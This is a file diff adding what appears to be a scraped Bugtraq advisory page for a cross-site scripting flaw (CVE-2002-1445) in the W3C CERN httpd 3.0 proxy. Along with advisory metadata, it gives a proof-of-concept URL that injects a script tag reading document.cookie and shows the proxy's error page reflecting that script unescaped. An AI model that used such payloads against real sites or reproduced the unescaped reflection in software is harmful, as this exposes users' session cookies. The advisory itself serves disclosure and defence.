@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid5447<p><b><span style="font-size: 18pt;">W3C CERN httpd Proxy Cross-Site Scripting Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/5447/info">info</a><br><a href="http://www.securityfocus.com/bid/5447/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/5447/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/5447/solution">solution</a><br><a href="http://www.securityfocus.com/bid/5447/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				5447
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2002-1445<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 12 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 03:56PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Reported by "TAKAGI, Hiromitsu" &lt;takagi.hiromitsu@aist.go.jp&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					W3C httpd 3.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	"TAKAGI, Hiromitsu" &amp;lt;takagi.hiromitsu@aist.go.jp&amp;gt; submitted this example:<br/><br/>Accessing the following URL with the browser configured to use CERN httpd as a proxy,<br/><br/>http://nonexistenthost.google.com/&amp;lt;SCRIPT&amp;gt;document.write(document.cookie)&amp;lt;/SCRIPT&amp;gt;<br/><br/>will cause CERN httpd Proxy to produce output like this:<br/>========================================================<br/>  &amp;lt;HTML&amp;gt;<br/>  &amp;lt;HEAD&amp;gt;<br/>  &amp;lt;TITLE&amp;gt;Error Message&amp;lt;/TITLE&amp;gt;<br/>  &amp;lt;/HEAD&amp;gt;<br/>  &amp;lt;BODY&amp;gt;<br/>  &amp;lt;H1&amp;gt;Fatal Error 500&amp;lt;/H1&amp;gt;<br/>  Can't Access Document:  http://nonexistenthost.google.com/&amp;lt;SCRIPT&amp;gt;document.write(document.cookie)&amp;lt;/SCRIPT&amp;gt;.<br/>  &amp;lt;P&amp;gt;<br/>  &amp;lt;B&amp;gt;Reason:&amp;lt;/B&amp;gt; Can't locate remote host:  nonexistenthost.google.com.<br/>  &amp;lt;P&amp;gt;<br/>...<br/>========================================================
+	
+		<ul>
+</ul>
+</div>
